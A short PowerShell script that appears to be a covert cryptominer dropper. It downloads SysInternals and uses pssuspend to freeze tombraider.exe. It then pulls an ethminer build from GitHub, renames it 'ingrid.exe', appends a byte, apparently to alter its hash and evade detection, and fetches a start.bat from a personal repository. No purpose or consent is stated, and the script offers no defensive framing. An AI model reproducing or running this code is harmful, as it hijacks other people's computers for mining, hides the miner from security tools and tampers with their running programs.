# Fix TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient

# URLs
$start = "https://github.com/Slurpgeit/temp/raw/master/start.bat"
$SysInternals = "https://download.sysinternals.com/files/SysinternalsSuite.zip"
$eth = "https://github.com/nanopool/genoil-ethereum/releases/download/v1.1.7/ethminer-0.9.41-genoil-1.1.7.zip"

# Functions
function Unzip($file, $destination) {
    $shell = new-object -com shell.application
    $zip = $shell.NameSpace($file)
    foreach($item in $zip.items()) {
        $shell.Namespace($destination).copyhere($item)
    }
}

# Run
$wc.DownloadFile($SysInternals,"c:\temp\sysinternals.zip")
Unzip -File "c:\temp\sysinternals.zip" -Destination "c:\temp"

.\pssuspend.exe -accepteula tombraider.exe

$wc.DownloadFile($eth,"c:\temp\eth.zip")
Unzip -File "c:\temp\eth.zip" -Destination "c:\temp"

move ethminer.exe ingrid.exe
echo a >> ingrid.exe

$wc.DownloadFile($start,"c:\temp\start.bat")
